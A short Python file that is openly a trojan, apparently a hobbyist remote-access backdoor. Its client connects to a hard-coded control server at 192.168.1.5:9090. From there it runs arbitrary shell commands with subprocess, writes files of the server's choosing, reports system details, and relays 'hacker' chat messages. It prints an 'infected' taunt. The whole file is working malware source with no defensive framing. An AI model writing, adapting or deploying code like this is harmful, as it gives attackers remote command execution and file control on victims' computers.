import socket
import platform
import subprocess

def trojan():
    HOST = '192.168.1.5'  # Server IP
    PORT = 9090              # Server Port

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    mode = 'default'

    def send_to_server(command, mode, message=False):
        package = f'{command}#{mode}'
        if message:
            package += f'#{message}'

        client.send(package.encode('utf-8'))

    while True:
        server_command = client.recv(1024).decode('utf-8')
        message = False

        if mode == 'default':
            if server_command == 'infect':
                print('\n\n\nYOU GOT INFECTED IHIHIHIH!')
            elif server_command == 'chat on':
                if mode == 'chat':
                    message = 'Chat mode is already on.'
                else:
                    mode = 'chat'
                    message = 'Chat mode on.'
            elif server_command == 'get_sysinfo':
                # Retrieve system information
                sys_info = platform.uname()
                message = f"System: {sys_info.system}, Node: {sys_info.node}, Release: {sys_info.release}, Version: {sys_info.version}, Machine: {sys_info.machine}"
            elif server_command.startswith('exec:'):
                # Execute shell command
                command = server_command.split(":", 1)[1]
                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    message = f"Command output:\n{result.strip()}"
                except subprocess.CalledProcessError as e:
                    message = f"Command failed:\n{e.output.strip()}"
            elif server_command.startswith("create_file:"):
                # Extract filename and content
                _, filename, content = server_command.split(":", 2)
                try:
                    with open(filename, "w") as file:
                        file.write(content)
                    message = f'File "{filename}" created successfully.'
                except Exception as e:
                    message = f'Error creating file: {e}'
        elif mode == 'chat':
            if server_command == 'chat off':
                mode = 'default'
                message = 'Chat mode off.'
            else:
                print(f'hacker says: {server_command}')


        send_to_server(server_command, mode, message)
